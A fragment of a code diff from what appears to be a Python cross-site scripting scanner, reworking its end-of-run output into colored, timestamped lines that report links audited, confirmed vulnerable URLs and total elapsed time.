+print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN}Total Links Audited: {total_links_audited}{Style.RESET_ALL}")
+
+if vulnerable_urls:
+    print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN}Confirmed Cross Site Scripting Vulnerabilities:{Style.RESET_ALL}")
     for url in vulnerable_urls:
-        print(url)
-    print(f"[{current_time}] Total Confirmed Cross Site Scripting Vulnerabilities: ", len(vulnerable_urls))
+        print(f"{Fore.GREEN}- {url}{Style.RESET_ALL}")
+else:
+    print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.RED}No Confirmed Cross Site Scripting Vulnerabilities Found.{Style.RESET_ALL}")
+
+print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN} Total Confirmed Cross Site Scripting Vulnerabilities: {len(vulnerable_urls)}{Style.RESET_ALL}")
+# Calculate elapsed time
+elapsed_time = time.time() - start_time
+elapsed_minutes = elapsed_time // 60  # Minutes
+elapsed_seconds = elapsed_time % 60  # Seconds
+
+# Print total time taken
+print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN} Total Time: {int(elapsed_minutes)}m {int(elapsed_seconds)}s{Style.RESET_ALL}")
